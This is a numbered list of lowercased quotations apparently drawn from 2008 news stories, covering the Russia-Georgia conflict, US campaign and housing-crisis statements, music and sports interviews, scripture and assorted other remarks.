8608447 and after six days jesus took with him peter and james and john his brother and led them up a high mountain by themselves and he was transfigured before them and his face shone like the sun and his clothes became white as light and behold there appeared to them moses and elijah talking with him
8608448 then i turned to see the voice that was speaking to me and on turning i saw seven golden lampstands and in the midst of the lampstands one like a son of man clothed with a long robe and with a golden sash around his chest the hairs of his head were white like white wool like snow his eyes were like a flame of fire his feet were like burnished bronze refined in a furnace and his voice was like the roar of many waters in his right hand he held seven stars from his mouth came a sharp two edged sword and his face was like the sun shining in full strength

8608453 the economics are counter intuitive temporarily restrict supply to increase uptake
8608454 this is not what we wanted to find but it has been our solid experience over two years and is a known paradox in economics
8608455 given that wikileaks needs to restrict supply for a period to increase perceived value to the point that journalists will invest time to produce quality stories the question arises as to which method should be employed to apportion material to those who are most likely to invest in it

8608464 the bottom line however is that the strong negative trend in summertime ice extent characterizing the past decade continues
8608465 we could have no ice at the north pole at the end of this summer and the reason here is that the thin ice and this ice we call first year ice the ice that tends to melt out in the summer
8608466 its possible that ships could sail from alaska right to the north pole
8608467 clearly if you look over what we have seen in the past three years and where we were headed we are in this long term decline and we may have no ice at all in the in summer by 2030 or so
8608468 the sight of russian tanks in a neighbouring country on the 40th anniversary of the crushing of the prague spring has shown that the temptations of power politics remain the old sores and divisions fester and russia is not yet reconciled to the new map of this region

8608478 the social web is all about sharing information and making friends online
8608479 its important for adults to know what kinds of socialization is happening kids dont understand the power of a permanent record something that can be seen by so many people in such a public way
8608480 rules make a big difference in kids behaviour even up to grade 11
8608481 we asked kids to articulate a positive online experience and the statement my parents would approve of this site rated quite high
8608482 there can be a real downside to those tools because your child will just go next door or down to the library to get on sites
8608483 it tells us that in contrast with the image that his campaign is spending millions of dollars to put forth that the idea of sen obama as a reformer as an agent of positive change is a great lie
8608484 and the veneer of ideological reasonableness about him is misleading because he is reflexively a liberal
8608485 and then share it with everyone else well we did we managed to successfully record it in
8608486 we wanted to make instruction available to students 24 7 and to provide student access to advice and productivity tools anytime and anywhere that made sense to them
8608487 with this consolidation we have addressed the need to have all of our servers centralized where they can be stored backed up and protected all in one location the dell solution provided everything from set up to the removal of our old pcs and boxes
8608488 we have to keep a close eye on the situation
8608489 its too soon to speculate what the widespread effect will be but regardless we still have ample airlift into and out of new york city
8608490 the difference is huge if you have to fly through dallas or chicago
8608491 you start to ask yourself if the size of the client relationship justifies the emotional and financial cost of the trip
8608492 if its mostly seniors flying to florida expecting 200 fares those flights are going to get cut
8608493 we started using virtualization to address power and space issues in our main datacenter we quickly adopted vmware esx as our standard platform for new projects and consolidated existing servers
8608494 it allowed us to continue business as usual and we experienced no delay in completing projects on time today we are way below our power threshold and gained about 50 of our floor space even after we doubled the amount of windows servers
8608495 before going virtual our datacenter power supply was maxed out we couldnt plug in a toaster now with less hardware we have capacity to handle whatever comes our way
8608496 this allowed us to condense many servers is a small amount of space with vmware and ibm bladecenters we were able to consolidate over a 150 servers into one rack
8608497 today we use hp dl580 g5 to handle larger server workloads
8608498 my memory is nearly gone but i remember two things
8608499 in the movie i chose a painter as the main character
8608500 my paintings are not appreciated by the public or critics so i tried to deal with painting and tried to show that it is not necessary to be successful as a painter
8608501 if you do something you like it is ok all the same
8608502 whether you are a hit or a miss is just like buying a lottery ticket
8608503 i havent had major success in japan but im not going totally bankrupt making movies it means i have earned something for the works

8608564 t he use of arable and meadowlands was under the supervision and direction of the community
8608565 just as the share of each member in so much of the mark as was distributed was of equal size so was his share also in the use of the common mark the nature of this use was determined by the members of the community as a whole
8608566 at fixed times and if necessary more frequently they met in the open air to discuss the affairs of the mark and to sit in judgment upon breaches of regulations and disputes concerning the mark
8608567 w hat existed in fact was not a tragedy of the commons but rather a triumph that for hundreds of years and perhaps thousands although written records do not exist to prove the longer era land was managed successfully by communities
8608568 it is to be expected that each herdsman will try to keep as many cattle as possible on the commons as a rational being each herdsman seeks to maximize his gain
8608569 we must admit that our legal system of private property plus inheritance is unjust but we put up with it because we are not convinced at the moment that anyone has invented a better system the alternative of the commons is too horrifying to contemplate injustice is preferable to total ruin

8608584 although its not without its shortcomings such as cripplingly poor quality graphics prints the brother hl 2170w balances out with speedy text printing and 802 11b g wireless functionality for just 150 wed certainly recommend it as a secondary text only printer if you already have a photo inkjet

8608637 our decision to engage was made in the last second as the russian tanks were rolling we had no choice
8608638 we took the initiative just to buy some time we knew we were not going to win against the russian army but we had to do something to defend ourselves
8608639 i got a call from the minister of defense that russian tanks some 200 were massing to enter tskhinvali from north ossetia
8608640 i ignored it at first but reports kept coming in that they had begun to move forward
8608641 that theyd been called up three days before from places like moscow we had intelligence coming in ahead of time but we just couldnt believe it also in recent weeks the separatists had intensified artillery barrages and were shooting our soldiers id kept telling our guys to stay calm actually we had most of our troops down near abkhazia where we expected the real trouble to start i can tell you that if wed intended to attack wed have withdrawn our best trained forces from iraq up front
8608642 some months ago i was warned by western leaders in dubrovnik to expect an attack this summer
8608643 mr putin had already threatened me in february saying we would become a protectorate of russia when i met mr medvedev in june he was very friendly i saw him again in july and he was a changed man spooked evasive he tried to avoid me he knew something by then i ask everyone to consider what does it mean when hundreds of tanks can mobilize and occupy a country within two days just the fuelling takes that long they were on their way would we provoke a war while all our western friends are away on vacation be sensible
8608644 in my heart there are two wolves one is the wolf of darkness fear mistrust sorrow and pain and the other one is the wolf of the light of lust hope and the joy of living both of them fight rather often with each other

8608647 i never considered a difference of opinion in politics in religion in philosophy as cause for withdrawing from a friend
8608648 the difference between chinas technological emergence and that of developed countries is that it is driven not so much by research as by commerce chinese companies by and large derive their technologies by buying them by copying them or by encouraging a foreign partner to transfer them as part of the price for access to a large potential market

8608652 they would be extremely worried about the precedent being set in abkhazia and south ossetia not just for taiwan but also xinjiang and tibet the question is whether china will side with russia and recognise them or not my guess is theyll hold out for as long as they can
8608653 ive seen war up close not as a political slogan or some think tank theory
8608654 i support barack obama because america needs a president who has the strength wisdom and courage to talk to our enemies and to consult with our allies
8608655 i am convinced that honouring senator clintons historic campaign in this way will help us celebrate this defining moment in our history and bring the party together in a strong united fashion
8608656 the republicans said i was too young and too experienced to be commander in chief
8608657 it didnt work in 1992 because we were on the right side of history and it wont work in 2008 because barack obama is on the right side of history
8608658 what it is like to have a president who put people first
8608659 before he ever debates barack obama john mccain should finish the debate with himself
8608660 you learn a lot about a man campaigning with him debating him and seeking how he reacts under pressure you learn about the strength of his mind but even more importantly you learn about the quality of his heart
8608661 i watched how he touched people how he inspired them and i realised he has tapped into the oldest american belief of all we dont have to accept a situation we cannot bear
8608662 a large number of interrelated steps are needed to reduce systemic risk that is the types of failures of institutions or procedures that might cause the entire system to crash such a calamity was narrowly avoided in march when the federal reserve took some extraordinary actions to prevent the abrupt failure of bear stearns cos in a nutshell those steps will involve limiting risks undertaken by financial institutions much of whats needed is likely to meet strong resistance because those limits might prevent a return to the high level of profitability that prevailed before so many people and institutions overreached and created the mess we are in today
8608663 the core inflation rate you see in the news the cpi less food and energy does do a fairly good job of representing the information the fed uses to forecast future inflation i e it is a measure of the trend rate of inflation but not the best one and it also does well at approximating the information the fed will use to set policy but the actual process it uses is more complicated than this and the fed employs measures that are specialized for the job at hand
8608664 despite the fact that one of the great social achievements of the last quarter century is the emergence of a black middle and professional class people of color are still over represented among the poor and working class the advantage of income based affirmative action is it would address many of the same issues as race based affirmative action but it would also address the needs of low income whites and income based affirmative action would not create tensions between lower income whites who dont benefit from race based affirmative action and blacks who do demagogues would have a harder time using race to stoke the fires of economic resentment finally income based affirmative action would lead to more economic diversity on our college campuses and more economic diversity is a key to reversing americas trend toward widening inequality

8608703 i compliment the group for coming together in a bipartisan way to try to address the current energy crisis
8608704 its nonsense that the u s government is inflating the price of ethanol especially at a time when american families are paying record high prices for fuel
8608705 not only is this tariff costing americans more at the pump its preventing us from diversifying our fuel supply
8608706 if were serious about reducing gas prices in this country removing this tariff and other arbitrary mandates created by congress would help reduce record high fuel costs
8608707 our bill will give agencies the tools to stop fraud at the front end rather than having the department of justice get involved at the back end after the fraud has occurred
8608708 instead of continuing the current practice of pay and chase the federal government needs to shift to a policy of detect and prevent
8608709 this will lead to less fraud and greatly reduce identity theft among our seniors
8608710 it will also allow seniors and the government to easily take a medicare recipients number out of circulation when fraud is detected
8608711 high gas prices are the single most important issue to americans right now and we need to focus on solutions for short term relief and long term domestic energy development
8608712 companies like csx are an important part of the long term strategy which will have to incorporate reliable available and inexpensive sources of energy

8608715 requiring family boaters to secure a clean water act permit so that they can wash their boat fish or go waterskiing is unreasonable costly and essentially unenforceable mobilizing the epa to take on this needless task would have been an additional cost and burden to families and a tremendous waste of taxpayer resources
8608716 most charter boats dont have the ballast issue that is the target of the court ruling there ought to be an opportunity to study where additional regulation is necessary and where it isnt
8608717 this bill provides a reprieve for small business owners who are already dealing with rising fuel prices and a troubled economy

8608722 mel will be able to have something to say on cuba
8608723 although congress has taken a number of steps to help alleviate the current housing crisis we need to proactively put practices in place that will help prevent another crisis down the road
8608724 setting minimum national standards for all residential mortgage loan originators will go a long way toward achieving that goal i am pleased this measure is included as part of the broader housing package
8608725 this broad housing legislation that the senate passed today will help hundreds of thousands of americans keep their homes
8608726 and the safe mortgage licensing act will ensure that americas mortgage brokers and lenders are ethical professionals unfortunately weve heard countless stories of bad actors in this industry people who engage in fraudulent lending practices such as steering people into loans they clearly cannot afford simply put the only way to crack down on these abuses is to ensure that brokers and lenders meet basic standards and earn a license this legislation does exactly that
8608727 this legislation will bring relief to many florida homeowners who face losing their homes the measure also puts long term fixes in place to prevent a housing crisis like this from occurring in the future
8608728 the reform includes a provision to modernize the fha allowing the program to insure larger loans and to reach more families that need help the bill will also provide a stronger oversight system for gses so they are better able to serve homebuyers and fulfill their public mission in addition tax credits for first time homebuyers will encourage those looking to make an initial purchase further helping to stimulate the housing market
8608729 although congress has taken a number of steps to help alleviate the current housing crisis we need to proactively put practices in place that will help prevent another crisis down the road
8608730 setting minimum national standards for all residential mortgage loan originators will go a long way toward achieving that goal i am pleased this measure is included as part of the broader housing package
8608731 while we still need to work to make appraisal standards uniform across the nation this strengthens standards for fha appraisals and ensures the integrity of the new fha program that offers foreclosure assistance
8608732 my commitment to doctors has always been to make certain they do not suffer pay cuts due to a faulty medicare reimbursement formula
8608733 the measure we moved forward today does not provide the kind of solution doctors deserve but this is the only option to stop doctors in florida from having their pay cut by 10
8608734 the presidents action underscores the importance of congresss attention to this matter in 2006 we secured a law that opened substantial areas to development while also protecting the eastern gulf of mexico until 2022 even with this announcement that protection remains
8608735 in light of the current energy crisis congress must take steps to develop domestic resources while encouraging conservation i look forward to congress acting to make it possible for states to engage in offshore development if they so choose and respect the wishes of states like florida that wish to keep drilling at a distance that doesnt impact our environment our economy or the missions of the united states military
8608736 florida is proud to be the home to the 4th fleet i commend the navys decision to re establish the 4th fleet in jacksonville which demonstrates mayports strategic importance to the region and national security
8608737 the fleets location in jacksonville will provide tremendous support to the u
8608738 with this issue were reaching out to people who thought we lost our way on fiscal issues
8608739 we hope as a result of that hearing theres going to be a much greater understanding of how big a problem it is
8608740 theres just so many needs in this arena and so little money that for it to be walking out the door with criminals is really a criminal deed itself
8608741 the more realistic approach is to highlight this issue to continue to work on it to continue to build support and then make a really really strong effort the next congress as part of what i believe will be a larger healthcare legislative effort
8608742 high gas prices are the single most important issue to americans right now and we need to focus on solutions for short term relief and long term domestic energy development
8608743 in the long term we need to take full advantage of our domestic resources which includes developing our oil supplies and also increasing our use of nuclear power nuclear power is safe emissions free power that can be used to make our nation energy independent
8608744 this is what floridas communities need right now the money and reassurance that assistance is on the way fay is leaving a lot of debris in her wake and expediting removal helps keep the public safe
8608745 this law will bring immediate relief to the suffering homeowners facing foreclosure while addressing long term changes necessary to strengthen the housing industry
8608746 this is a prime example of how effective congress can be when legislators put politics aside and come together in a bi partisan manner to best serve the american people during a time of crisis
8608747 the report released today further demonstrates why agencies need tools to stop fraud at the front end rather than having the department of justice get involved at the back end after the fraud has occurred
8608748 medicare fraud is not only hurting seniors but it is also wasting taxpayer dollars instead of continuing the current practice of pay and chase the federal government needs to shift to a policy of detect and prevent
8608749 what i dont want is for the best to be the enemy of the good
8608750 if we can come up with a genuine bipartisan compromise in which i have to accept some things i dont like and the democrats have to accept some things they dont like when its actually moving us in the direction of energy independence im open to that
8608751 what i will not do is support a plan that suggests that drilling is the answer to our energy problems
8608752 no one really knows where barack obama is on the issues these days
8608753 what we do know is that hes spent months attacking john mccains common sense plans to increase domestic production so anything he says should be taken with a grain of salt hell probably try to refine his stands a few more times before november if it is in his political interest
8608754 the one thing that ive said consistently when it comes to the florida coastline is that as dependent as this state is on tourism as important as that coastline is weve got to proceed with extreme caution when it comes to anything that has an impact on that extraordinary treasure
8608755 to help formulate this vision im going to re establish the national aeronautics and space council so that we can develop a plan to explore the solar system a plan that involves both human and robotic missions and enlists both international partners and the private sector and as america leads the world to long term exploration of the moon and mars and beyond lets also tap nasas ingenuity to build the airplanes of tomorrow and to study our own planet so we can combat global climate change under my watch nasa will inspire the world once again
8608756 in no way do i think that john mccains campaign is being racist i think theyre being cynical
8608757 i think they want to distract people from talking about real issues
8608758 and government cant and shouldnt do for us what we can do for united states senate 356 russell senate office building washington dc 20510
8608759 having an office at the usf tampa campus will provide better accessibility for people seeking assistance with federal issues
8608760 i am excited to join the usf community and look forward to serving gulf coast residents at this location
8608761 the needs of the veterans in this community have grown beyond the navy and va facilities capabilities the clinics are old undersized and substandard the renovations made possible by the joint inventive fund will help but a new facility still needs to be built
8608762 i will continue doing all that i can to ensure the health care needs of bay countys veterans retired and active duty personnel and their families are being met and that a new facility remains a priority for the navy and va
8608763 florida has been hit hard by the housing crisis ranking second in the nation in record foreclosures last year this bill is the product of congress coming together to address this crisis and bring relief to floridians who face losing their homes
8608764 while addressing the current crisis this also strengthens the housing market for the long term modernization of the fha will allow the program to serve more families after the recent problems with freddie mac and fannie mae it is clear that we need a stronger oversight system for gses to better fulfill their public mission and this bill puts that system in place
8608765 the current crisis has shown us that while some homeowners unfortunately made bad financial decisions others were clearly taken advantage of by bad actors in the housing industry national licensing standards will help decrease the number of unscrupulous loan originators and predatory mortgages
8608766 the safe act will help to eliminate fraudulent loan originators from the housing industry and give more reassurance to homebuyers at a time when they are making an important financial commitment in purchasing a home
8608767 this is the first step in working to make appraisal standards uniform across the nation
8608768 this provision strengthens standards for fha appraisals and ensures the integrity of the new fha program that offers foreclosure assistance
8608769 americans need to have peace of mind that they have life insurance coverage when traveling abroad people should not be denied coverage or have to pay outrageous amounts for a policy based on where they travel
8608770 this legislation ensures that insurance companies cannot use future travel plans as a basis to increase rates or cancel coverage it is my hope that the banking committee will act quickly to pass the lift act so that it can move to the full senate for consideration
8608771 no matter the conflict members of our armed forces answer the call rise to the challenge and make tremendous sacrifices on behalf of a grateful nation
8608772 as an immigrant to america i have been the beneficiary of those who sacrificed so that i might have the opportunity to live in freedom having lived in oppression i can assure you that freedom is a valued gift and i thank you for your service in the cause of freedom
8608773 access to quality health care is a right everyone who has worn our nations uniform deserves
8608774 i am happy to say that this long overdue dream of so many central florida veterans is finally moving forward we have secured the property the plans are in the works and its only a matter of time before a new hospital comes online and begins serving area veterans
8608775 this is a real crisis for floridians and the american family inaction from congress is not acceptable
8608776 more production is part of the equation while i have guarded floridas coast there are safe places we can explore including the 8 million acres we opened in the eastern gulf we need to throw everything at the problem more research into new and alternative sources of energy and development of better plug in vehicles in addition conservation is a crucial element
8608777 two games doesnt make a lifetime it doesnt make a career

8608780 you play this game long enough and you know teams are going to hit skids like this its just part of the game but its still frustrating to go through it
8608781 the first day we were here haren pitched really well and today for them to win both of those games and sweep us the off day might be coming at the right time for us
8608782 were fighting some demons the demons of the past the rascals that have hung around us for a year

8608784 i think cintron was the player of the game because hes supposed to be in the lineup roberts played and he killed us i think im going to blame cintron for that one
8608785 that germany is still in better shape than most other eurozone economies
8608786 the clock for the german is literally ticking it is only a matter of time before the economic slowdown will be felt
8608787 we expect clearer traces of the economic slowdown to become visible later this year
8608788 was in line with the trend established over the past two years
8608789 to fall modestly further during the latter months of 2008 and possibly even in early 2009 despite the dampening influence from the slowdown in economic growth

8608815 i stood once in the test room of a great steel mill all around me were little partitions and compartments steel had been tested to the limit and marked with figures that showed its breaking point god does not want us to be like vases of glass or porcelain he would have us like toughened pieces of steel able to bear twisting and crushing to the uttermost without collapse he wants us to be not hothouse plants but storm beaten oaks not sand dunes driven with every gust of wind but granite rocks withstanding the fiercest storms to make us such he must needs bring us into his testing room of suffering many of us need no other argument than our own experiences to prove that suffering is indeed gods testing room of faith
8608816 it is very easy for us to speak and theorize about faith but god often casts us into crucibles to try our gold and to separate it from the dross and alloy oh happy are we if the hurricanes that ripple lifes unquiet sea have the effect of making jesus more precious better the storm with christ than smooth waters without him

8608825 women are discriminated against widely for a variety of reasons and until those reasons are addressed the problem will remain for instance look at the laws such as the inheritance law property law and land and land units law they are all biased towards men
8608826 the idea behind this initiative is to use the religious sentiment to make people change their mindset against the girl child where laws have failed to curb the heinous crime of female foeticide this sentiment will hopefully work
8608827 until laws which are biased towards men are not changed it will be difficult to change the negative trend of female foeticide

8608840 the association between magnesium sulfate and a lower incidence of cerebral palsy has biologic plausibility because magnesium stabilizes blood vessels protects against damage from oxygen depletion and protects against injury from swelling and inflammation all of which threaten the vulnerable preterm brain
8608841 our study is the largest most comprehensive effort to evaluate the effect of magnesium sulfate on the incidence of cerebral palsy in preterm infants
8608842 our finding that magnesium sulfate protects against cerebral palsy is consistent with two previous randomized trials both of which were well done and which in total enrolled over 1 600 women our trial and the two others show that magnesium sulfate can reduce the risk of this devastating condition in preterm infants until we can prevent early preterm birth the best that we obstetricians can do is to improve the prospects for infants who are born very early i think that our study says that magnesium sulfate can help us do that

8608858 in the second quarter we successfully refinanced our short term debt related to the golden telecom acquisition following the refinancing we started to intensify our sales and marketing efforts in the russian mobile segment resulting in 11 quarter on quarter revenue growth in this segment
8608859 we are also very happy with our performance in the cis where we showed strong growth and increased revenue market share and arpu in all geographies
8608860 we will continue to focus our efforts along three key priorities for the company developing integrated operations in russia including a strong push in the broadband business continued development in the cis markets and expansion outside of the cis these priorities prompted us to make some adjustments to our organizational structure which we believe will enhance the focus and efficiency of our business

8608864 and the ability of that experience to travel with the user and automatically adapt to new locations is equally powerful
8608865 these results are encouraging as they show that operators are keen to enjoy the fruits of fmc as soon as possible that said service providers need to ensure they have the correct software platform in place to ensure the transition to fmc is completed as smoothly as possible such software is already being used today an example being comptels convergent solutions the problem arises when legacy non convergent software is being used in other parts of the operators oss for example billing systems it is apparent that oss vendors need to advise operators effectively on how best to move to a fully convergent oss
8608866 it is up to operators to ensure their oss is ready for fmc comptels dynamic oss solutions enable telecom service providers to deliver services flexibly and charge for them effectively in a converged or legacy environment our software allows operators to launch new services with a fast time to market and we already proving beneficits to customers deploying fmc solutions such as taiwans fareastone and many other of comptels customers

8608932 from our point of view synthesizers seemed to have a limitless and almost magical quality to them magical in the sense that you could create a keyboard sound out of almost nothing and have it perfectly fit your musical disposition
8608933 it didnt go all that well for a while its always hard for us to write music that we all like and at the beginning we were out of practice
8608934 i think on the last record we kind of felt a little weird about it
8608935 like maybe it didnt end up feeling like our record so much
8608936 we knew we could make a great sounding record but there were times when a song just wasnt coming together when it didnt ring true so we just took another whack at it a bunch of songs were overhauled like this while others came together very quickly

8608944 ruslands doel is zijn oude invloedssferen te heroveren maar door te weigeren het vredesplan van de franse president sarkozy uit te voeren en door de eenzijdige erkenning van de onafhankelijkheid zullen ze zich internationaal isoleren ze kunnen niet de hele internationale gemeenschap tegen zich in het harnas jagen alleen hamas heeft de staatjes inmiddels erkend dat is niet bepaald een diplomatiek succes voor rusland te noemen

8608948 its no surprise that consumer products companies are focusing their efforts on international markets to boost sales given the weak economy in the united states
8608949 and despite international markets continuing to show positive growth for consumer products companies we are beginning to see optimism wane as the impact of the u s economy begins to influence international markets
8608950 with the rise in commodity prices and the challenges raised with a weak economy consumer products companies are having to develop new strategies to remain successful
8608951 this could include rebalancing their product portfolios resizing packaging reformulating products and managing transportation costs as they try to reign in expenditures and curtail the necessity for price increases

8608978 a lot of people say well what do you actors need why are you speaking up youre not people who need anything and its true were very blessed but almost all of us come from real middle class families and because we have the platform that we do it makes it a little bit easier for us to speak up speak out but everyone should really be doing it mostly im just here because im a bleeding heart liberal and a concerned citizen and i cant wait to hear the speeches every election is historic but this one is particularly so and so im so excited to be here
8608979 i dont feel very good about the last eight years and i feel like were in a place where we really need theres a lot of damage that we need to recover from and we need a very strong and inspirational leader to bring us out of this its pretty grim
8608980 i did support hillary rodham clinton in the new york primary because ive been an admirer of hillarys for a long time shes been an excellent senator and of course i was slightly biased by the fact that she was a woman i never thought that in my lifetime i would have the pleasure of voting for a woman for president so i did vote for her in the primary but i always admired barack obama and when it became time for hillary to step aside and for obama to become the nominee i was very pleased to be able to support him and i prayed that he would pick joe biden for his vice president i thought that was the best possible choice
8608981 one of the benefits and pleasures of being an actor is having the opportunity to travel around the united states to travel overseas i began traveling to europe and asia when i was about 20 and the respect that our country had the regard that our country had throughout the world was so tremendous the embrace that youd receive just for being an american was extraordinary and over the last eight years during my travels ive seen that love for our country become so compromised that i dont know how well ever regain our stature in the world
8608982 if you go overseas you see how much theres an excitement that a country that the rest of the world felt got so lost suddenly is on track enough to make a change this dramatic not only an african american but a man whose name is barack obama theres so many different elements of it that suddenly make i think the rest of the world feel like hey maybe theyre not as insane as we think they are and that to me is primarily what i keep seeing

8608991 that then relates right into speed of play and decision making understanding and the ability to take something that has happened and transform it into a positive
8608992 thats what separates you from average to good and good to great
8608993 so that has been my no 1 focus this year

8608999 we started using virtualization to address power and space issues in our main datacenter we quickly adopted vmware esx as our standard platform for new projects and consolidated existing servers
8609000 it allowed us to continue business as usual and we experienced no delay in completing projects on time today we are way below our power threshold and gained about 50 of our floor space even after we doubled the amount of windows servers
8609001 before going virtual our datacenter power supply was maxed out we couldnt plug in a toaster now with less hardware we have capacity to handle whatever comes our way
8609002 this allowed us to condense many servers is a small amount of space with vmware and ibm bladecenters we were able to consolidate over a 150 servers into one rack
8609003 today we use hp dl580 g5 to handle larger server workloads
8609004 theres an old clich in sports that goes youve gotta have the horses
8609005 we had a run of three straight years four out of five years to the ncaa cross country championships which came to an end last year
8609006 there are 300 division i teams in america and 31 make it to nationals so its pretty challenging

8609013 i debate every day so its not a matter of debate
8609014 we have always had some strong front runners the last three or four years
8609015 but we have always fallen off rapidly after the third or fourth runners this year we have a much more talented group top to bottom
8609016 being the oldest and the leader i am going to have to lead by example
8609017 i want to show them that to get to nationals we have to put in the work by completing our workouts and doing them right
8609018 so i want to build on it i want to end my collegiate career as an all american and as one of the top 10 runners for our team to do what it wants to do i need to do that
8609019 a lot more depth is going to be very beneficial and help us get back to nationals
8609020 we have had runners stand out but there has always been that gap hopefully this year we can bring those pack runners closer to the top
8609021 we have to keep our best runners healthy so we can get to the end of the season and still run well
8609022 if we want to compete at the big ten championships regionals and nationals we just have to stay healthy

8609024 sr 241 opponents specifically the surfrider foundation and the sierra clubs friends of the foothills are using sima resources to repeatedly assert false claims that the toll road will cause the closure of the san mateo campground and damage the surf break at trestles
8609025 their assertions are nonsense even a noted researcher at scripps institution of oceanography has studied the project and determined that it will have no impact on surfing or wave formation
8609026 recreational opportunities in the park san onofre state beach include the ocean the beach the trails and camping there is no reason to believe san mateo campground will be negatively impacted by the sr 241 project any more than passing trains or the movements of tens of thousands of cars and trucks on interstate 5 have impacted the popularity of the bluff campgrounds

8609036 the big news isnt that daily newspapers arent hiring women as critics its that many of them have ceased caring whether they have a full time movie critic at all
8609037 dont trouble me as much as the pervasiveness of the idea that critics the last line of defence between moviegoers and studio generated hype no longer matter
8609038 was so laughably low the editor who interviewed me made no secret that the paper wanted to hire a female critic but clearly what the joint really wanted was a cheap date
8609039 in fact jon is not endorsing mccain or obama at this point he went to the fundraiser to learn more about the candidate and would like to do the same with obama if the opportunity presents itself

8609047 we have one song with vocals we treat a voice as just another instrument with a melody line its another texture we want to produce something thats not complicated keep it simple and it takes care of itself

8609087 would you like me to heat those up or anything
8609088 i dont feel that we as anberlin have evolved into something our fans wont recognize christian explains but i definitely think we have matured musically and broadened our listening tastes coming into our own as a band
8609089 never seeing us live he never knew how intense we were says christian he realized that the second album had to reflect what he saw live energy
8609090 we are amazed at the reaction from the last album christian elaborates its crazy how many bigger bands in our genre know our music when we were here in north carolina and an older gentleman came up to me and we talked for a couple of minutes about bands and music he went on to tell me that his son adam had gotten him hooked on anberlin and he had been a fan ever since i learned after leaving the show that the man that i had met was adam from taking back sundays dad i couldnt believe it adam got his dad hooked on our music
8609091 at tooth and nail there was a glass ceiling and there was no way to get our music out to all the people we wanted to reach
8609092 to us universal republic represents a sense of stability in this turbulent era for music the staff is going nowhere the label is here to stay and they have proven time and time again that they can take bands to the people and that is where we belong among the people
8609093 the whole album is conceptualized around the theme of a new surrender in the sense that everyone in their lives has something they know they have to give up
8609094 theres something thats holding each of us back from who we could become so i think each song kind of tackles that theme of surrendering parts of life whether its a person or a vice
8609095 there was no trial period we just went for it
8609096 it definitely helped having someone else to bounce ideas off of
8609097 neal avron did not let me get away with anything
8609098 i live in los angeles now so i wrote a song about homelessness because thats something thats so prevalent in my life
8609099 theres also about another song about living unselfishly and the lyrics say
8609100 im really excited that weve got to the level lyrically where our fans dont listen to anberlin for just the basic oh girl i want to hold your hand
8609101 in some ways i dont think we have that much emotional attachment to music nowadays
8609102 i want people to feel like they belong to this record its their record and i want them to treat it like that
8609103 hopefully new surrender doesnt just have one single that everyone attaches himself or herself to

8609126 random house is free to publish or decline to publish whatever it likes and its decision to do either has nothing whatsoever to do with the western tradition of free speech or any other high sounding abstraction
8609127 may have been cowardly or alarmist or it may have been good business or it may have been an attempt to avoid trouble that ended up buying trouble
8609128 i was never angry about their decision and theyre a private corporation they can do whatever they want
8609129 in terms of censorship i would say that random house censored itself this is a classic case of self censorship based on fear
8609130 when you pull a book because you think youll lose money thats a corporate decision when you pull a book because you fear terrorist attack thats self censorship until random house execs heard warnings of possible violence over my book the company had my book on the fast track to best sellerdom so they clearly had expected to make money from its publication
8609131 this new forecast may be achievable but it certainly puts a lot of faith in the companys sales performance in emerging markets if those start to falter in the way some economists are predicting toyota is going to have to cut again later in the year
8609132 the business environment is rapidly becoming more difficult things remain very uncertain not just in the united states but in emerging countries and resource rich nations as well we cannot be optimistic now

8609135 serious ideas even if offensive to some flourish in books
8609136 random house has exhibited a degree of cowardly self censorship that seriously threatens the american public s access to the free marketplace of ideas we do this reluctantly since our most recent prize in american historical fiction went to a random house title nevertheless this issue must be confronted

8609148 he shepherded it he made sure it happened he assigned staff to it gave them carte blanche to do with they needed they spent days and nights on it
8609149 actually ive fallen several times like four times already but this one time i fell it was the only one that made perez hilton and youtube i didnt think anything of it when it happened i just laughed it off onstage but the next day i see that it hit the internet and i was like nooooooo it totally stung because i wasnt expecting it but i didnt get hurt and joe jonas helped me out a lot with that he made a ton of jokes about it
8609150 i did a duet with the jonas brothers on my album and we wrote the song together
8609151 its like a breakup song and its called on the line it was important to have them on my album because i mean just look at how successful they are i would love to have their input anytime because theyre obviously doing something right
8609152 i tend to write songs that are i guess a little bit more intense and less catchy and i needed help writing catchy songs
8609153 so thats where they came in i put a lot of my musical input and lyrics into these songs and they just helped me with hooks and stuff like that
8609154 theres a song i wrote myself that i hope fans will react to and connect with
8609155 the song is about feeling insecure and just not feeling pretty and i hope girls my age can relate to it because i just felt like there needed to be a song about how not everyone has confidence i know it sounds cheesy but its true
8609156 i used to write really dark songs every night in my room like five or six a night and id be up until 5 in the morning and my mom would come up and say so what are you writing
8609157 id play her a song and shed go wow go to therapy but it really is therapy for me so i put everything in my lyrics you wont necessarily find a lot of that on the album but hopefully you will on the next album its my first one so i wanted it to be fun stuff you can drive around in your car to and jam out to
8609158 shes done collaborations with reba mcintire who was her idol growing up and kelly clarkson has been my idol growing up hopefully one day i could collaborate with her that would be the biggest dream come true

8609163 silver and gold silver and gold id rather have jesus than silver and gold no fame or fortune nor riches untold id rather have jesus than silver and gold
8609164 the record it got leaked then me and kirk franklin had to talk he was doing most of the talking he was saying it wasnt no disrespect he was saying he knows how songs get leaked he had it happen to him before he said he wasnt a saint and it wasnt like he never did nothing wrong its not like kirk said i did something wrong he said if i was gonna go with it just change the melody you can still say silver and gold hes got a lot of people saying stuff to him how could you let t pain destroy a gospel song like that how could let him talk about alcohol i wasnt even doing it for a mixtape or nothing i was literally drinking and made a song i was bored in the studio there was nothing else to do i made it into an alcoholic anthem which wasnt good
8609165 everybody thought it was the first single somebody was putting it out as the first single off of new album pain or pleasure somebody was just making up an album name just so they can put it out thats why my album isnt coming out on my birthday no more because i had to push it back we had to stop that song
8609166 that pushed the single back then we had to push the album back

8609174 its not often that a band comes around with a completely new sound ex norwegian manage to combine powerpop classic rock and indie music to set themselves apart from whats already out there
8609175 so a five to 10 minute jog would be ok but 30 to 40 minutes would not be
8609176 when running you can establish a hierarchy and have a dog that is more calm confident and secure
8609177 most dogs i deal with are under exercised and lots of times walking is not sufficient on its own
8609178 if youre an active person its easy to combine your run with the dogs walk
8609179 ideally you should jog with your dog in off leash areas so that he or she can got at his or her own pace and has the option to speed up or rest if needed
8609180 you and your dog may not have the same ideal pace and it may be difficult for your dog to match your stride comfortably or even safely
8609181 start with short distances and build up endurance over time do not force your dog if he or she is lagging behind and wishes to rest
8609182 make sure you and your dog are acclimatized to current temperatures before attempting your regular jog
8609183 even moderate temperatures can be dangerous if you and your dog are not used to them yet
8609184 since the earliest sign of heat stroke is excessive panting which may look a lot like normal panting its always best to avoid running in hot weather and choose cooler times of the day for your jog

8609189 ancora oggi continuo a pensare che ognuno sia artefice del suo destino
8609190 leave the system alone if i can do it anyone can
